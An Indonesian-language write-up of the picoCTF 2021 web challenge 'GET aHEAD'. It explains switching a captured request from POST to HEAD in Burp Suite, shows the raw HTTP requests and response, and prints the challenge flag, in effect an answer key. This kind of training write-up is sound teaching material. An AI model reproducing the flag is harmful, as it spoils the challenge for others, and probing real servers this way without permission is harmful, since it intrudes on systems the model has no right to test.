# GET aHEAD

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2021 |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Easy |
| Status | Solved |

## Deskripsi

Challenge ini meminta pemain untuk menemukan flag yang tersimpan pada server web. Berdasarkan petunjuk, pemain diarahkan untuk mengeksplorasi pilihan request method HTTP di luar yang disediakan secara visual oleh aplikasi.

## Informasi Awal

Instance challenge dapat diakses melalui:

```text
http://wily-courier.picoctf.net:50160
```

Tampilan web menyajikan dua tombol pilihan:
- `Choose Red`
- `Choose Blue`

Petunjuk (*hints*) yang diberikan pada challenge:

1. `Maybe you have more than 2 choices`
2. `Check out tools like Burpsuite to modify your requests and look at the responses`

## Tools

- Browser (Chromium / Firefox)
- Burp Suite Community Edition (Proxy, HTTP history, Repeater)

## Analisis

Nama challenge `GET aHEAD` serta petunjuk `Maybe you have more than 2 choices` memberikan indikasi kuat mengenai manipulasi HTTP request method.

Saat tombol pada halaman ditekan:
- Tombol `Choose Red` mengirimkan request dengan method `GET` ke `/index.php?` yang menghasilkan halaman berlatar belakang merah.
- Tombol `Choose Blue` mengirimkan request dengan method `POST` ke `/index.php` yang menghasilkan halaman berlatar belakang biru.

Dua pilihan tersebut merepresentasikan HTTP method `GET` dan `POST`. Sesuai petunjuk nama challenge (`HEAD`), request dapat diubah menggunakan method `HEAD` untuk memeriksa apakah server mengembalikan informasi tambahan pada response header.

## Langkah Penyelesaian

### 1. Mengakses instance challenge

Halaman dibuka melalui browser pada alamat instance:

```text
http://wily-courier.picoctf.net:50160
```

Halaman menampilkan dua panel pilihan tombol, yaitu `Choose Red` dan `Choose Blue`.

### 2. Memeriksa lalu lintas HTTP dengan Burp Suite Proxy

Lalu lintas HTTP dianalisis melalui tab `Proxy` -> `HTTP history` di Burp Suite:
- Menekan tombol `Choose Red` menghasilkan request `GET /index.php? HTTP/1.1`.
- Menekan tombol `Choose Blue` menghasilkan request `POST /index.php HTTP/1.1`.

Request `POST /index.php` yang tertangkap:

```http
POST /index.php HTTP/1.1
Host: wily-courier.picoctf.net:50160
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://wily-courier.picoctf.net:50160
Connection: keep-alive
Referer: http://wily-courier.picoctf.net:50160/index.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

### 3. Mengirim request dengan method HEAD via Burp Suite Repeater

Request tersebut dikirim ke tab `Repeater` (`Ctrl+R`), kemudian method `POST` diubah menjadi `HEAD`:

```http
HEAD /index.php HTTP/1.1
Host: wily-courier.picoctf.net:50160
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://wily-courier.picoctf.net:50160
Connection: keep-alive
Referer: http://wily-courier.picoctf.net:50160/index.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

### 4. Mengambil flag dari response header

Setelah request dikirim, server memberikan response header berikut:

```http
HTTP/1.1 200 OK
Date: Sun, 23 Aug 2026 07:56:39 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
flag: picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Flag ditemukan pada header `flag`.

## Flag

```text
picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
```

## Pembelajaran

- Server web dapat memberikan response berbeda tergantung pada HTTP request method yang digunakan (`GET`, `POST`, `HEAD`, dan lainnya).
- Method `HEAD` meminta response identik dengan request `GET`, tetapi tanpa menyertakan response body sehingga informasi penting sering kali diletakkan pada response headers.
- Burp Suite Repeater mempermudah pengujian berbagai HTTP method secara cepat tanpa dibatasi oleh form input yang ada di UI browser.

## Referensi

- [MDN Web Docs - HTTP request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- [RFC 7231 - Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content - HEAD](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.2)
